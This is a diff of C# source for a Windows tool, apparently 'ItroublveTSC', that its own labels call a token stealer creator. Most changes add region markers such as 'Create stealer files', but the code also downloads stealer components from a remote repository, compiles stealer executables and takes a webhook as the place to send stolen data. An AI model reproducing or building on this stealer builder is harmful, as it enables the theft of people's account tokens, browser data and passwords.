@@ -15,6 +15,7 @@ namespace ItroublveTSC
 {
     public partial class frmMain : Form
     {
+        #region GUI
         public frmMain()
         {
             this.InitializeComponent();
@@ -27,7 +28,8 @@ namespace ItroublveTSC
             this.PnlRainbowDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
             this.pictureBox1.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
         }
-
+        #endregion
+        #region Checks
         private void frmMain_Load(object sender, EventArgs e)
         {
             if (Directory.Exists("bin_copy"))
@@ -35,6 +37,8 @@ namespace ItroublveTSC
                 Directory.Delete("bin_copy", true);
             }
         }
+        #endregion
+        #region Create stealer files
         private void CreateBtn_Click(object sender, EventArgs e)
         {
             bool flag = this.WebHookTxt.Text == "" || this.WebHookTxt.Text == "Webhook Here";
@@ -89,6 +93,8 @@ namespace ItroublveTSC
 
             }
         }
+        #endregion
+        #region closebtn
         private void CloseBtn_Click(object sender, EventArgs e)
         {
             if (File.Exists("TokenStealerCOPY.bin"))
@@ -101,6 +107,8 @@ namespace ItroublveTSC
             }
             Environment.Exit(0);
         }
+        #endregion
+        #region Useful Junk
         private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
         {
             Mouse.x = Control.MousePosition.X - base.Location.X;
@@ -117,7 +125,8 @@ namespace ItroublveTSC
                 base.Location = Mouse.newpoint;
             }
         }
-
+        #endregion
+        #region Compile changes to EXE
         private void roundBtn1_Click(object sender, EventArgs e)
         {
             bool flag = this.FinalresbatTxt.Text == "" || this.FinalresbatTxt.Text == "Token Stealer.bat Link Here";
@@ -227,7 +236,7 @@ namespace ItroublveTSC
                         string _cdDir = Path.GetDirectoryName(Application.ExecutablePath) + "/bin";
                         DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                         using (WebClient webClient = new WebClient())
-                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/bin.zip?raw=true", "bin/Token Stealer Creator.zip");
+                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/5.0/AVOID%20ME/bin.zip?raw=true", "bin/Token Stealer Creator.zip");
                         ZipFile.ExtractToDirectory(_cdDir + "/Token Stealer Creator.zip", _cdDir);
                         File.Delete(_cdDir + "/Token Stealer Creator.zip");
                         MessageBox.Show("bin files has been downloaded successfully.\r\nItroublveTSC will now close, please relauch to create stealer!", "ItroublveTSC");
@@ -261,19 +270,21 @@ namespace ItroublveTSC
                 }
             }
         }
-
+        #endregion
+        #region "How to use" Button
         private void roundBtn1_Click_1(object sender, EventArgs e)
         {
             try
             {
-                Process.Start("https://youtu.be/H05oG6aQnto");
+                Process.Start("https://itroublvehacker.ml/howtousev5");
             }
             catch(Exception ex)
             {
                 MessageBox.Show("Failed to open" + "How To Use\r\n" + (ex.Message), "ItroublveTSC");
             }
         }
-
+        #endregion
+        #region Enable/Disable textbox
         private void CustomEXEchkbox_CheckedChanged(object sender, EventArgs e)
         {
             if (CustomEXEchkbox.Checked)
@@ -285,7 +296,8 @@ namespace ItroublveTSC
                 CustomExeTxt.Enabled = false;
             }
         }
-
+        #endregion
+        #region Put Icon
         private void roundBtn2_Click(object sender, EventArgs e)
         {
             if (!File.Exists("bin_copy/Program.cs"))
@@ -344,12 +356,14 @@ namespace ItroublveTSC
                 }
             }
         }
+        #endregion
 
         private void roundBtn3_Click(object sender, EventArgs e)
         {
             frm2 fm = new frm2();
             fm.ShowDialog();
         }
+        #region Placeholder
         private void WebHookTxt_Enter(object sender, EventArgs e)
         {
             if (WebHookTxt.Text == "Webhook Here")
@@ -477,5 +491,6 @@ namespace ItroublveTSC
                 AssemblyCopyrTxt.Text = "Assembly © Copyright";
             }
         }
+        #endregion
     }
 }
